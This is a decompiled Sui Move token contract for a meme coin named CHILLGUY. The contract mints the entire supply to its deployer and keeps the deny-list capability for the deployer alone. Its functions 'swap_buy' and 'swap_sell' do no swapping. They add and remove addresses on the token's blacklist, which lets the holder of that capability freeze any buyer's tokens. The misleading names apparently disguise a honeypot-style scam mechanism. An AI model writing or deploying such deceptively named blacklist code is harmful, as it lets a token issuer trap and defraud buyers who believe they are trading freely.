module 0x9cbf4b028158824acce998b16e27c8835d531e5570bf052c1c58c2191df8c9f5::chillguy {
    struct CHILLGUY has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: CHILLGUY, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<CHILLGUY>(arg0, 9, b"CHILLGUY", b"Just a chill guy", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmaFy59TMnLb4jGgL6LpquyXSxTRXKR4mEfSobUSsPoR46"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<CHILLGUY>(&mut v3, 100000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<CHILLGUY>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<CHILLGUY>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<CHILLGUY>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<CHILLGUY>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<CHILLGUY>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<CHILLGUY>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

